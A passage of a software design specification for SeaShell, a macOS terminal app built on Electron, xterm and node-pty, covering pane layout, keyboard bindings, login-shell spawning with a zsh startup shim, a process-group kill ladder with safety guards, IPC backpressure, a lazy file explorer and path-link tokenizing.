| 6 | `R[ C[p1,p4], C[p2,p3], C[p5,p6] ]` | **3 × 2** ✓ |

`MAX_PANES_PER_TAB = 6`. The "+" button and ⌘D are disabled at 6 with a tooltip "Tab is full (6 panes) — open a new tab (⌘T)". An attempted 7th insert is a no-op that leaves the tree byte-identical (unit-tested).

When a new column k+1 is appended, scale existing root ratios by `k/(k+1)` and give the new column `1/(k+1)`. When a pane is appended to an existing column, scale that column's existing ratios by `m/(m+1)` and give the newcomer `1/(m+1)`.

**There is no `pristine` bit, no Rebalance command, and no one-time reflow hint.** An earlier draft carried a persisted `tab.pristine` mode bit so that dragging a divider made the layout "sticky"; that created the problem that a tab dragged once never re-tidied, which was then patched with a ⌘⇧R Rebalance command, two menu entries, and a hint toast — three features managing a consequence of the first one, none of them requested. **Insert always runs the canonical arranger above; close always redistributes the freed ratio proportionally among siblings (§6.5).** Revisit only if reflow-after-close feels wrong in real use (§19).

### 5.3 Minimums

Constraints are expressed in **cells**, converted to pixels at layout time.

```
MIN_COLS   = 20   MIN_ROWS = 6      // hard drag clamp and PTY floor
DIVIDER_PX = 9                      // hit strip; 1px visual line centered
TITLEBAR_PX = 24
```

xterm's own floor (`MINIMUM_COLS = 2`, `MINIMUM_ROWS = 1`) is useless; enforce ours. Leaf pixel minimums: `minW = 20*cellW + 12`, `minH = 6*cellH + TITLEBAR_PX + 12`.

**The window minimum is computed once, at startup, for the worst legal layout** — 3 columns × 2 rows at `MIN_COLS × MIN_ROWS`, plus dividers, title bars, sidebar and status bar — and applied with a single `win.setMinimumSize` call:

```
rootMinW = 3*minW + 2*DIVIDER_PX + sidebarW
rootMinH = 2*minH + 1*DIVIDER_PX + 58
win.setMinimumSize(min(rootMinW, workArea.width - 40), min(rootMinH, workArea.height - 40))
```

Because that minimum bounds *every* reachable layout, no legal tree can violate it, which deletes an entire tier of machinery an earlier draft carried: the `AUTO_MIN_COLS`/`AUTO_MIN_ROWS` second tier, the auto-insert refusal path, its "Not enough room for another pane" toast, its error-table row, and the iterative water-filling assignment loop. Divider drag then needs only a direct clamp over the two adjacent siblings:

```
size_i ∈ [minPx(i), span - DIVIDER_PX - minPx(i+1)]     // minPx = subtree minimum
```

Subtree minimums still propagate bottom-up (row node: `minW = Σ children.minW + DIVIDER_PX*(n-1)`, `minH = max(children.minH)`; column node transposed) because the drag clamp reads them.

The clamp to `workArea − 40` matters for a layout restored onto a smaller display: macOS will not honor a minimum larger than the work area, and fighting it leaves the layout permanently over-constrained. If a layout's true minimum exceeds the clamp, **keep the tree** and let panes render below `MIN_COLS`/`MIN_ROWS`, emitting a one-time `ui:notice` (`LAYOUT_CRAMPED`) rather than refusing to lay out.

### 5.4 Zoom

⌘↩, or double-click a pane title bar (guard: ignore when `e.target.closest('.pane-label-input, .pane-close')`). Toggles `tab.zoomedPaneId`. It is **pure view state and never mutates the tree.**

Hidden panes get `display: none`. **Never `visibility: hidden`, `opacity: 0`, or an off-screen transform** — those still report as intersecting, so xterm's IntersectionObserver would never pause and all five background panes would keep rendering. A CSS lint rule and a `dom` test assert the hidden-pane class computes to `display: none`; the `e2e` project additionally asserts real hidden terminals fire `onRender` zero times (§16.5).

**Hidden panes are never resized.** No `fitAddon.fit()`, no `pty.resize()`, no SIGWINCH. A resize would make Claude Code reflow its whole UI (measured: `claude --help` produced 231 lines at 80×24 and 697 lines at 20×10 in a real PTY) and would make xterm destructively reflow scrollback (`Buffer._reflowSmaller` / `_reflowLarger` are not exact inverses — shrink-then-grow loses trailing-whitespace fidelity). Because zoom is view-only, unzooming with no window resize is a literal no-op refit.

Every `fit()` and `pty.resize()` call site is gated on an explicit `pane.visible` boolean maintained by the layout engine. `pane.visible` is false for panes in a background tab **and** for panes hidden by zoom in the active tab. Dev builds assert that `pty.resize` is never called for `visible === false`. Never iterate all panes.

### 5.5 Keyboard model — Cmd only, zero Ctrl bindings

Every binding is an Electron `MenuItem.accelerator` on the application menu.

| Action | Accelerator | Action | Accelerator |
|---|---|---|---|
| New Tab | `Cmd+T` | New Pane (auto-place) | `Cmd+D` |
| Open Folder in New Tab | `Cmd+Shift+O` | Close Pane | `Cmd+W` |
| Close Tab | `Cmd+Shift+W` | Next / Prev Pane (DFS) | `Cmd+]` / `Cmd+[` |
| Next / Prev Tab | `Cmd+Shift+]` / `Cmd+Shift+[` | Toggle Zoom | `Cmd+Return` |
| Select Tab 1–9 | `Cmd+1` … `Cmd+9` | Clear pane | `Cmd+K` |
| Toggle File Explorer | `Cmd+B` | Refresh explorer | `Cmd+R` |
| Focus File Explorer | `Cmd+Shift+E` | Copy / Paste / Select All | `Cmd+C` / `Cmd+V` / `Cmd+A` |

Cut from v1 as unrequested and individually expensive: **Focus pane L/R/U/D** (`Cmd+Alt+arrows` — needs a geometry-based directional search over pane rects), **Nudge divider 1 cell** (`Cmd+Alt+Shift+arrows` — an entire second resize input path with its own clamping), **New Pane in New Column** (`Cmd+Shift+D` — a manual placement mode that contradicts the approved auto-arranged grid and forks the §5.2 insert rule), **Rebalance** (`Cmd+Shift+R`, see §5.2), and **Find in pane** (`Cmd+F`, see §3). `Cmd+]`/`Cmd+[` DFS cycling covers navigation for six panes and pointer drag covers resize. All are listed in §19.

**Zero Ctrl bindings, ever.** Every `Ctrl+<letter>` maps to a C0 code that zsh ZLE and Claude Code bind (A/E/K/U/W/R/L/P/N/D/Z/C/B/O/T/Y/G/X). `Ctrl+Tab` is also unusable: xterm's Tab branch keys only on `shiftKey`, so `Ctrl+Tab` emits `C0.HT` (0x09) = literal Tab = completion.

Cmd is safe: SeaShell's `attachCustomKeyEventHandler` returns `false` for **every** `metaKey` chord (§4.3), so nothing Cmd-modified ever reaches xterm or the PTY.

Do **not** use Electron menu `role: 'selectAll'` / `'copy'` / `'paste'` — they would swallow the chord before the pane sees it. Bind custom handlers that dispatch on:

```ts
appFocusZone: 'pane' | 'explorer' | 'tabbar' | 'viewer'
```

| Chord | `'pane'` | `'explorer'` | `'tabbar'` | `'viewer'` |
|---|---|---|---|---|
| `Cmd+W` | Close Pane (§6.5) | Close Pane | Close Tab | **Close the viewer panel.** The pane's session is untouched. |
| `Cmd+A` | `term.selectAll()` | tree select-all | — | select all loaded viewer text |
| `Cmd+C` | `term.getSelection()` → `clip:write`; **no-op when the selection is empty** (never SIGINT) | copy selected paths | — | copy viewer selection |
| `Cmd+V` | `clip:read` → `term.paste(text)` | — | — | — |

The `'viewer'` zone is not optional. Menu accelerators fire regardless of DOM focus, so without it ⌘W with the viewer focused would run the §6.5 kill ladder on a live `claude` pane behind the panel — destructive and unrecoverable. Opening the viewer sets `appFocusZone = 'viewer'` and records the previous zone; `Escape` closes the viewer and restores it. A `dom` test asserts that dispatching the `close-pane` `ui:command` while the zone is `'viewer'` closes the panel and leaves the session alive.

**⌘K semantics.** `term.clear()` — keep the current line, drop scrollback, which is Terminal.app's ⌘K. It is a **no-op with a brief pane flash** when `term.buffer.active.type === 'alternate'`, because clearing the buffer under a running TUI corrupts its redraw assumptions. Never send `\x0c`.

**Tab bar overflow.** Tabs shrink from 200px toward a 90px minimum; below that the strip scrolls horizontally with the active tab kept in view. `Cmd+1`…`Cmd+9` index the tab list; **`Cmd+9` is always the last tab**, per macOS convention.

**New tabs and tab identity.**

- `Cmd+T` opens a tab whose `cwd` is the **active tab's cwd** if one exists, else `os.homedir()`. It is never `cwdOfLaunch` — a Finder or Dock launch makes that `/`, which would root the explorer at the filesystem root. `cwdOfLaunch` remains in `app:getPaths` as a **diagnostic value only** and no feature reads it.
- `Cmd+Shift+O` (File ▸ Open Folder in New Tab) calls `app:pickFolder` → `dialog.showOpenDialog({properties:['openDirectory']})` in main, and opens a tab rooted there. A tab's folder can also be changed later via **Set folder…** in the tab context menu, which re-roots the explorer.
- `tab.name` defaults to `basename(tab.cwd)` (`~` for home, `/` for root) and is edited by **double-clicking the tab title**, using the same inline-input component and the same `nameIsCustom` latch as the pane label (§6.3). Once custom, SeaShell never touches it.
- **`tab.cwd` is fixed for the tab's lifetime** except through Set folder…. Panes may `cd` freely; the pane cwd of §8.5 is a separate value used for labels and relative-path resolution. The explorer root follows `tab.cwd`, **not** the active pane's live cwd, so OSC 7 churn never moves the tree under the user.

Menu accelerators are delivered to the renderer over the `ui:command` channel. `Escape` in the explorer returns focus to the active pane and never reaches a PTY.

---

## 6. Pane and PTY lifecycle

### 6.1 Spawn — always a login shell

**Every pane's PTY root is `/bin/zsh -l`. Never spawn `claude` or a user command directly.** The "+" menu's `claude` and `run command…` entries pass the command to main as `runAfterStart`; main puts it in the child's environment as `SEASHELL_RUN` and the ZDOTDIR shim runs it once the shell is fully initialized (§6.2).

> **Conflict resolved.** One research draft spawned the target command as the PTY root. The uniform-shell model wins because it gives: one process model (shell is a session leader, `pid == sid == pgid`, since node-pty spawns with `POSIX_SPAWN_SETSID`); `~/.zprofile`/`~/.zshrc` sourcing, which is where `claude` gets on PATH; shell history; a live shell left behind when the program exits; and OSC 7 cwd reporting for free.

> **Conflict resolved.** An earlier draft wrote `claude\r` into the shell's stdin "once it settles (first `onData` byte, or 300 ms, whichever comes first)". Both triggers are unreliable: the first `onData` byte is typically a login banner or a powerlevel10k instant-prompt escape, all of which arrive well before ZLE accepts input, and 300 ms is shorter than many real `.zshrc` loads (nvm, oh-my-zsh). Losing or mangling the injection would make the app's primary flow — "+" → claude — intermittently produce an empty shell or a garbled command line, timing-dependent and hard to reproduce. `SEASHELL_RUN` is deterministic: it runs exactly when the shell is ready, needs no timing at all, and is still main-constructed env, so §13 item 6 holds.

```ts
const p = pty.spawn('/bin/zsh', ['-l'], {
  name: 'xterm-256color',
  cwd: resolvedCwd,           // see below
  cols, rows,                 // from FitAddon; never spawn 80x24 and resize after
  encoding: null,             // raw Buffers
  handleFlowControl: false,   // we drive pause()/resume()
  env: buildEnv(pane),
})
pane.shellPid = p.pid
pane.tty = path.basename(p.ptsName)   // e.g. "ttys004" — matches ps(1)'s tty column
```

`ptsName` exists at runtime (`Object.defineProperty(UnixTerminal.prototype, 'ptsName', …)`) but is **not** on node-pty's public `IPty` interface, so under this repo's `strict: true` / TS 7 it is a compile error. Declare it once, in `src/main/pty/manager.ts`, as a module augmentation rather than an inline `as any`:

```ts
declare module 'node-pty' { interface IPty { readonly ptsName: string } }
```

This is sound because SeaShell is a Unix-only build. §15.9 requires re-verifying the augmentation on any node-pty upgrade.

If `pane.tty` does not match `/^ttys\d+$/`, the spawn fails with **`ETTY`** rather than storing a junk value — see the mass-kill guard in §6.5.

**Stale cwd is handled at spawn, not by refusing.** The most likely bad cwd is exactly the one that gets persisted: a removed worktree, a cleaned `/tmp` directory, an unmounted volume. Before spawning, main walks the requested cwd up to the nearest existing readable directory, falling back to `os.homedir()`:

```
resolvedCwd = nearest existing readable ancestor of requested, else os.homedir()
if (resolvedCwd !== requested) response includes cwdFallback: resolvedCwd
```

The spawn **succeeds**. The pane shows a one-line dismissible notice: `~/Desktop/gone no longer exists — started in ~`. `ECWD` is reserved for the case where even `$HOME` is unreadable. Without this, §11.2's Restore button and §14's "Retry" action would fail identically forever.

Spawn order is fixed: create node → layout → `new Terminal()` → `term.open()` → `fit()` → read `term.cols/rows` → `pty:spawn`. The child never sees a wrong initial size.

`buildEnv` (pure, `src/main/pty/env.ts`) starts from `process.env`, then:

- deletes `COLORTERM`, `ELECTRON_RUN_AS_NODE`, every `ELECTRON_*`, `NODE_OPTIONS`, and every `npm_*`
- sets `TERM=xterm-256color`, `TERM_PROGRAM=SeaShell`, `TERM_PROGRAM_VERSION=app.getVersion()`, `SEASHELL_PANE_ID=<uuid>`
- sets `LANG` to the inherited value or `en_US.UTF-8`; leaves `LC_ALL` deleted (matching Terminal.app, which sets only `LANG`)
- sets `ZDOTDIR` to the shim directory and `SEASHELL_USER_ZDOTDIR` to the user's original `ZDOTDIR` or `$HOME`
- sets `SEASHELL_RUN` to the pane's `runAfterStart` string, or leaves it unset

**The renderer cannot influence env.** `pty:spawn` accepts only `{paneId, file, args, cwd, cols, rows, runAfterStart}`; `runAfterStart` is a command *string* that main places in exactly one whitelisted variable and never merges into env wholesale. Env is otherwise constructed entirely in main.

### 6.2 The ZDOTDIR shim

Written once per app launch to `app.getPath('userData')/zdotdir/`:

- `.zshenv`, `.zprofile`, `.zlogin` — each sources `$SEASHELL_USER_ZDOTDIR/<same name>` if readable, nothing else.
- `.zshrc` — sources `$SEASHELL_USER_ZDOTDIR/.zshrc` **first**, then appends the OSC 7 hook and the `SEASHELL_RUN` block.

**The OSC 7 encoder is Apple's, verbatim.** An earlier draft carried a clever one-liner that was described as "the exact percent-encoding macOS ships in `/etc/zshrc_Apple_Terminal`" but was not, and had three real bugs: `(#b)` backreference syntax requires `setopt extendedglob`, which is off by default in zsh and the function never enabled it, so the substitution silently did nothing; `(s::)PWD` splits by **characters** under the inherited UTF-8 locale, so `日` would emit `%65E5` (the codepoint) instead of `%E6%97%A5` (the UTF-8 bytes), and the renderer's `decodeURIComponent(new URL(d).pathname)` would then produce a wrong cwd, silently mis-resolving every cwd-relative linkified path in that pane; and `[##16]` does not zero-pad, so any byte below `0x10` emitted a single hex digit. The safe-character set also differed (`!`, `*`, `'` left raw where Apple encodes them).

The body below is copied from `/etc/zshrc_Apple_Terminal` lines 16–39 as read on this host, renamed:

```zsh
autoload -Uz add-zsh-hook
_seashell_osc7() {
  local url_path=''
  {
    # LC_CTYPE=C processes byte-by-byte; LC_ALL and LANG must not interfere.
    local i ch hexch LC_CTYPE=C LC_COLLATE=C LC_ALL= LANG=
    for ((i = 1; i <= ${#PWD}; ++i)); do
      ch="$PWD[i]"
      if [[ "$ch" =~ [/._~A-Za-z0-9-] ]]; then
        url_path+="$ch"
      else
        printf -v hexch "%02X" "'$ch"
        url_path+="%$hexch"
      fi
    done
  }
  printf '\e]7;%s\a' "file://$HOST$url_path"
}
add-zsh-hook precmd _seashell_osc7

if [[ -n $SEASHELL_RUN ]]; then
  _seashell_cmd=$SEASHELL_RUN
  unset SEASHELL_RUN
  print -s -- "$_seashell_cmd"       # goes into shell history, as if typed
  eval "$_seashell_cmd"
  unset _seashell_cmd
fi
```

The shim must source the user's config **first** so a user `precmd` cannot clobber ours, and the `SEASHELL_RUN` block must come last so the command runs against a fully initialized shell. `unset` before `eval` means a nested shell never re-runs it. If the shim directory cannot be written, log once, emit `ui:notice` `SHIM_UNWRITABLE`, and fall back to `lsof` cwd sampling only; `runAfterStart` panes then show their restart card with "couldn't initialize the shell hook — press Restore to run `claude`".

A `pty` integration test spawns a pane, `cd`s into `~/Desktop/日本 test` (a space **and** a non-ASCII character), and asserts the OSC 7 payload round-trips through `decodeURIComponent(new URL(d).pathname)` to that exact absolute path. This is the gnarliest untested code in the spec and it gets a dedicated test.

### 6.3 Pane title bar

24px. Left to right: `[N]` 1-based DFS index (recomputed on every reflow) · editable label · command badge (`zsh` / `claude` / `cmd`, 12px) · busy dot · memory badge · idle badge · close button.

**Label** defaults to `basename(cwd)` (`~` for home, `/` for root), tracked from the cwd sources in §8.5. Duplicate labels within a tab are disambiguated by prepending up to 2 parent segments, then `#2`, `#3`. Once the user edits a label, `labelIsCustom = true` and SeaShell never touches it again.

**Busy dot**: 6px pulsing dot when `now - lastOutputTs < 2000 ms` (§10.3). For shell panes, if `pty.process` differs from the root command, show it: `[2] seashell · npm ●`. Claude Code 2.1.220 is a native Mach-O binary, so `pty.process` always reports `claude` for those panes.

**Memory badge**: shows the pane's RSS total when ≥ 200 MB, e.g. `766 MB` (§10.2).

**Idle badge**: `idle 42m` (`idle 3h20m` past 60 min) when `now - lastInputTs ≥ 15 min` and the pane is not busy. **`lastInputTs` is initialized to the pane's spawn timestamp**, so a freshly spawned pane is never immediately idle. There is no `unattended` badge — an earlier draft invented one for the `top` / `tail -f` case, which nobody asked about and whose label (`4h`) disagreed with its own 2 h trigger.

### 6.4 Exit

`onExit({exitCode, signal})` marks the pane **dead** — *unless* main has set that session's `closing` flag (§6.5), in which case `pty:exit` is suppressed entirely and the renderer is never told. Never auto-close, never auto-restart. The scrollback stays intact and scrollable; `term.options.disableStdin = true`; the cursor layer is hidden via `.pane--exited`. A non-modal bottom overlay appears:

- exit 0 → neutral: `zsh exited · 0   [Restart ⏎]`
- non-zero → danger: `claude exited · code 1   [Restart] [Copy last 200 lines]`
- signalled → `claude killed · SIGKILL (9)   [Restart]`

Restart runs `term.reset()`, re-enables stdin, and respawns with the **last observed** cwd (subject to the §6.1 walk-up fallback) and the pane's original command. This is the identical affordance as the persistence restore button (§11.2), so there is exactly one code path: a pane is *unstarted* (restored from disk) or *dead* (exited); both render a restart button; neither auto-runs.

### 6.5 Close and kill — process groups

`IPty.kill()` is **never** the shutdown path. It is `process.kill(this.pid, 'SIGHUP')` on the *positive* pid, and it was measured to leave a disowned child alive at ppid 1. `kill(-shellPid, SIGTERM)` alone is equally useless: interactive zsh ignores SIGTERM, and zsh job control puts each foreground job in its own pgid (observed shell pgid 8553, `claude` pgid 8582).

**The ladder, four steps.** An earlier draft had seven, including a SIGTERM round between SIGHUP and SIGKILL; §6.5 itself noted that interactive zsh ignores SIGTERM, making that round the least valuable 1500 ms in the sequence and pushing a stuck close past 3 s across four process-table scans.

```
1. snapshot = paneProcs(pane)               // BEFORE any signal — see below
   session.closing = true                   // suppresses pty:exit (§6.4)
2. kill(shellPid, SIGHUP)                   // zsh HUPs its job table; claude can save state
3. wait 1500 ms, re-sweep
4. for pgid of distinct(snapshot.pgid): kill(-pgid, SIGKILL)
   then for each pid still alive: kill(pid, SIGKILL)
5. await the session's onExit — that is what releases the master fd.
   If it has not fired within 2000 ms, log `PTY_FD_LEAK <paneId> <pid>` and count it in survivors.
6. re-sweep; anything still alive is reported via ui:notice, never swallowed
```

Step 5 replaces "dispose the IPty (closes the master fd)". Verified against `node-pty@1.1.0`'s `typings/node-pty.d.ts`: `IPty` has exactly `pid, cols, rows, process, handleFlowControl, onData, onExit, resize, clear, write, kill, pause, resume` — **there is no `dispose()`**. The master fd is released only by node-pty's internal `_close()` when the child exits and `onExit` fires, so awaiting `onExit` is the only correct formulation and the 2000 ms timeout is what keeps risk 35's fd-leak concern bounded and visible.

Verified end-to-end (with the SIGTERM round, which the shortened ladder subsumes into step 4): zero survivors on a pane running a busy foreground job plus a `(sleep 601 &)` already reparented to launchd. SIGHUP alone did not.

**`paneProcs(pane)` and the mass-kill guard.** `paneProcs` = (ppid subtree rooted at `pane.shellPid`) ∪ (every process whose tty equals `pane.tty`). The tty arm is load-bearing: it catches double-forked descendants the ppid walk misses. It is also a mass-kill hazard, because **740 of the 751 processes on this host report no controlling terminal** (`ps -axo tty=` prints `??`). If `pane.tty` were ever empty, `??`, or otherwise unset, the tty arm would select nearly every daemon on the machine and step 4 would `kill(-pgid, SIGKILL)` all of them. Therefore, unconditionally:

1. The tty arm is **not built at all** unless `pane.tty` matches `/^ttys\d+$/`. Anything else (including `??`) yields an empty tty arm and the ppid subtree alone.
2. Every sweep row is filtered to `uid === process.getuid()` before either arm is unioned.
3. `pty:spawn` fails with `ETTY` rather than storing a junk tty (§6.1).

A `ps-parse` unit-test fixture contains `??` rows, other-uid rows, and a valid `ttys004` row, and asserts the pane set is exactly the expected three pids.

**Confirmation and reflow.** Closing a pane that is busy, or whose foreground process is not its own shell, shows an inline confirm listing the concrete processes to be killed. **On confirm the leaf is removed and the grid reflows immediately** — the ladder then runs detached in main and reports only if survivors remain. The user never watches a dying pane for three seconds. Closing the last pane closes the tab; closing the last tab leaves an empty-state window. Never auto-spawn.

**Focus after close**, in order: next sibling below → previous sibling above → if the column died, the pane in the left neighbour column with the greatest vertical rect overlap, else the right neighbour → else the tab's first pane.

**Reflow after close**: remove the node and redistribute its ratio **proportionally** among its siblings; an emptied column is removed and its width redistributed proportionally across the remaining columns.

**Renderer crash reaping — mandatory.** A renderer crash otherwise orphans every live PTY on a 16 GB machine, which is the exact failure mode SeaShell exists to prevent: main owns every `IPty`, the reloaded renderer has fresh pane IDs and never acks the old ones, so §6.6's `unacked` counters climb past 1 MiB and main `pause()`s each orphan permanently with its `zsh` and `claude` children alive, unreachable, and invisible in the new UI — and §11.2 would then offer Restore buttons that spawn a *second* set of six. So, in main, on **both** `webContents.on('render-process-gone')` and `webContents.on('destroyed')`:

```
for each session in the map: run the full ladder above (in parallel)
clear the PtyBatcher map and every unacked counter
bump rendererEpoch (§6.6)
only then reload the window
```

A `pty` integration test spawns three panes, force-kills the renderer, and asserts `paneProcs()` returns zero survivors for all three.

**App quit — the state machine.** `before-quit` must not be cancelled pending an unbounded renderer round trip; if the renderer is hung the quit would never complete and the user would Force Quit, orphaning every PTY.

```
1. main calls e.preventDefault() on the FIRST before-quit only
2. main sends app:beforeQuit
3. main awaits app:quitReply (invoke) with a 2000 ms timeout
     reply: {state, panes: Array<{tabName, paneIndex, label, command,
                                  busy, rssBytes, procCount, busyMs, idleMs}>}
   on timeout: log QUIT_TIMEOUT, skip the modal, persist the state main already
   holds from the 2 s debounced state:save, and go to step 5
4. MAIN owns the modal — dialog.showMessageBox, not a renderer overlay:

     Quitting will kill 3 panes and 7 processes:
     • Tab "solarbear" pane 2 — claude (766 MB), busy 12m
     • Tab "aio" pane 1 — claude (455 MB), idle 3h20m, 2 child processes
     [Cancel]  [Quit and kill]

   Cancel → clear the quitting flag, return.
5. Run every pane's kill ladder IN PARALLEL under a global 4000 ms budget.
   Six serial ladders would be ~18 s of a beachballed quit and macOS would
   offer to force-quit out from under us.
6. SIGKILL any remainder, then app.exit(0).
```

The single-pane form of the same dialog is reused for closing a busy pane.

### 6.6 Backpressure

Measured on this host: node-pty delivers 1024-byte chunks (min 10, p50 = p95 = max = 1024) at up to ~4,340 chunks/s and ~4.2 MiB/s. Forwarding each chunk over IPC would be ~4,300 structured-clone round trips per second per pane.

**Coalesce in main.** `PtyBatcher` (pure, `src/main/pty/batcher.ts`) holds `Map<paneId, Buffer[]>`. The first pending byte arms a timer; flush also fires immediately at 64 KiB total pending. One flush emits **one** `pty:data` message containing all panes' batches, each pane's chunks joined with `Buffer.concat`.

The message is **copied once**, not transferred. `webContents.send(channel, …args)` has no transfer-list parameter — arguments go through the Structured Clone Algorithm in both directions, and the only transfer-capable Electron path is `MessagePortMain.postMessage(message, transfer)`, which is rejected below. So the honest claim is: **one structured-clone copy per flush covering all panes, versus ~4,300 copies per second per pane without batching.** The 8 ms / 100 ms coalescing and the 64 KiB ceiling are what buy the win. A `PtyBatcher` unit test asserts the number of **messages emitted per second**, not bytes copied.

- **Flush interval is keyed on visibility, not tab membership**: **8 ms** when `pane.visible === true`, **100 ms** otherwise. "Background tab" alone was underspecified, because a pane hidden by zoom is in the active tab but not visible, and §4.5/§5.4 build the entire hidden-pane story on it not rendering.
- A channel per pane is rejected: Electron dispatch is a per-message map lookup, not per-channel, so it gains nothing while adding register/unregister bookkeeping, a listener-leak bug class, and loss of cross-pane batching. `MessagePortMain` is rejected because main must already touch every byte for the ack window and idle tracking.

**Ack window.** The renderer calls `term.write(bytes, () => seashell.pty.ack(paneId, bytes.byteLength, epoch))`. Main tracks `unacked` per pane: `pty.pause()` above **1 MiB**, `pty.resume()` below **256 KiB**. `pause()` was verified to apply true kernel backpressure — a producer loop advanced 5 iterations in 3 s while paused versus ~328/s unpaused, with 0 bytes delivered.

**Epoch, so a reload cannot deadlock every pane.** Main keeps a `rendererEpoch`, incremented on every `did-finish-load` (and by the crash handler in §6.5). Acks carrying a stale epoch are **discarded**. On every epoch change, each session's `unacked` is zeroed and `resume()` is called unconditionally. Without this, a post-crash reload would leave main's pre-crash `unacked` counters holding bytes that can never be acked, so every paused PTY stays paused forever and the app comes back looking alive with dead terminals. A `unit` test asserts resume-on-epoch-change.

**Never drop bytes.** Dropping splits escape sequences and corrupts the emulator. xterm's internal `WriteBuffer` yields every 12 ms and hard-discards above a 50 MB watermark, but that discard is data loss; the ack window exists so it is never reached.

`scrollback: 5000`. `BufferLine` is `Uint32Array(cols * 3)` = 12 bytes/cell, so at 200 columns that is 2.4 KB/line ≈ 12 MB/pane worst case, ≈ 72 MB for six. Lines allocate lazily, so idle panes cost far less.

---

## 7. File explorer

Left sidebar, 260px default, resizable 180–520px, collapsible with ⌘B. Collapsed state and width persist.

**Lazy.** One `fs:readDir` per expanded directory. Nothing is ever walked recursively. Root is the active tab's `cwd` (§5.5) — never the active pane's live cwd.

**`.gitignore`** via `ignore@7.0.6`, not hand-rolled — negation, anchoring, and `**` are subtle. Main keeps `Map<dirPath, Ignore>` built by walking up to the nearest `.git` directory, stacking each `.gitignore` in order, and testing paths relative to each file's own directory with POSIX separators and a trailing `/` for directories. Entries are returned with `ignored: true` and **hidden by default rather than dropped**, so the "show ignored" toggle needs no re-read.

`node_modules`, `.git`, and `.DS_Store` are returned with `ignored: true` **and are shown when the toggle is on**, exactly like every other ignored entry. The only special-casing is that they are marked ignored even in a directory with no `.gitignore`. An earlier draft filtered them unconditionally, which made the toggle a lie and made the two most common reasons to open one impossible: reading a dependency's source inside `node_modules`, and opening `.git/config`.

**No live watching in v1.** An earlier draft carried `watcher.ts` with a 64-handle LRU pool keyed on visibility, a 250 ms per-path debounce, a rule never to watch ignored directories, three IPC channels, and a risk row documenting that macOS `fs.watch` filenames are unreliable enough that the event payload had to be discarded entirely — and then conceded that "⌘R and refresh-on-window-focus always exist, so correctness never depends on the watcher", which is an argument for deleting it. Live watching was not an approved requirement. **Freshness comes from three explicit triggers instead: ⌘R, window focus, and expanding a directory (which always re-`readDir`s).** Reinstate watching later only if stale-tree friction is observed in real use (§19).

**Symlinks.** The explorer resolves them explicitly rather than leaving the behavior to the implementer:

- A symlinked directory renders with an **arrow badge** and is expandable.
- `fs:readDir` **refuses to expand** when the entry's realpath is equal to, or a path prefix of, the realpath of any ancestor node already open in the tree. It returns `{ok:true, entries:[], cycle:true}` and the row renders `symlink loop` and becomes non-expandable. Without this, `ln -s .. loop` inside an open tree makes expansion infinitely deep.
- A **broken** symlink still renders (and still linkifies, §8.3) with a `dangling` marker.
- DENY rules (§8.6) are applied to the **realpath**, so a symlink pointing at an `.app` or a `/dev` node is denied.

**Rendering.** Fixed 22px rows. Virtual scrolling (window = viewport + 20 rows) kicks in above 200 rendered rows. A directory over 5000 entries returns `truncated: true` and renders a "Show all N entries" row.

**Interaction.**
- Single click selects. Arrow keys navigate; Right expands, Left collapses or moves to parent; Enter = double-click.
- Double click: directory → expand/collapse; file → the routing table in §8.6 (viewer or default app).
- **Drag into a pane** pastes the file's absolute path at the cursor, shell-quoted with single quotes (`'` inside the path escaped as `'\''`), followed by a single space. Implemented with HTML5 drag-and-drop; the drop handler calls `seashell.pty.write(paneId, quoted + ' ')`. Dropping on the pane title bar is ignored.
- EACCES directories render greyed with a lock glyph and are not expandable.

---

## 8. Path detection and double-click opening

### 8.1 Link API

`@xterm/xterm@6.0.0` exposes exactly one path-linkification API: `Terminal.registerLinkProvider(p: ILinkProvider): IDisposable`. `registerLinkMatcher` / `deregisterLinkMatcher` are gone from the 6.0.0 typings. `options.linkHandler` is OSC-8 only and is not the path API. Note that `@xterm/headless@6.0.0` exposes **no** link-provider API at all (verified against its `typings/xterm-headless.d.ts`), which is why the provider tests live in the `dom` project, not `pty` (§16.3).

`bufferLineNumber` and `ILink.range.{start,end}.{x,y}` are **1-based absolute buffer rows** (scrollback-inclusive): `term.buffer.active.getLine(y - 1)`. `term.select(column, row, length)` takes a **0-based** column and 0-based absolute row — convert with `-1` on both.

**The provider is decoration-only.** xterm fires `link.activate` on *mouseup*, so a double-click would fire it twice. SeaShell supplies `activate: () => {}` and does all opening from its own listeners. `decorations` is `{pointerCursor: true, underline: true}` when the pane's mouse tracking is off, and `{pointerCursor: false, underline: false}` when tracking is on and Option is not held; an `Alt` keydown/keyup listener mutates `link.decorations.underline` on the live link object (xterm defines setters there and re-renders).

`provideLinks` is trailing-debounced 60 ms. It returns cached hits synchronously and invokes its callback a second time once the stat batch settles.

### 8.2 Tokenizer (`src/renderer/links/tokenizer.ts`, pure)

Shared by the link provider and the double-click handler **so hover and open can never disagree.** That is now an unconditional invariant, and a unit test asserts hover and double-click produce identical spans for every fixture. An earlier draft violated it in the same breath by adding a double-click-only unique-prefix fallback (see below).

Signature: `tokenize(line: string, {home: string, cwd: string}) → Candidate[]`. Both values are **arguments**, never lookups — the renderer is sandboxed and `os` is deliberately absent from the preload surface (§12), so an earlier draft's "expand `~` against `os.homedir()`" would have thrown and silently killed every `~/…` link. `home` is cached from `app:getPaths` at startup; `cwd` comes from §8.5. This also keeps the module `[pure]` and unit-testable with no environment.

**Logical line assembly.** From row *y*, walk backward while `getLine(k).isWrapped`, forward while `getLine(k+1).isWrapped`; cap at 2048 cells. Join cell by cell via `line.getCell(x, reusableCell)`, skipping cells whose `getWidth() === 0`, appending `cell.getChars() || ' '`, and pushing the `(y, x+1)` pair once per appended UTF-16 code unit into an `idxMap`. Building the map during the join (not reconstructing it afterwards) is what keeps CJK and emoji columns exact.

**Pass 1 — quoted.** `/'([^'\n]{1,1024})'|"([^"\n]{1,1024})"/g`; emit contents verbatim. This is how spaced paths are supported.

**Pass 2 — runs.** Split on `HARD = /[\s"'`<>|]/`, treating `\ ` (backslash-space) as a path character and unescaping it afterwards. Per run, in order:
1. Strip balanced wrapping `()`, `[]`, `{}`.
2. Strip a trailing `)`, `]`, `}` only when unbalanced within the run.
3. Strip trailing `.,;:!?` repeatedly.
4. Extract a line/column suffix: `/^(.+?):(\d{1,7})(?::(\d{1,7}))?$/` (grep, eslint, tsc, stack traces).

The MSBuild-style `a.ts(3,9)` form is **not** supported in v1. tsc emits both forms, so nothing is lost; the `(3,9)` variant cost a second regex plus a false-positive interaction with the balanced-bracket stripping happening in the same pass. Listed in §19.

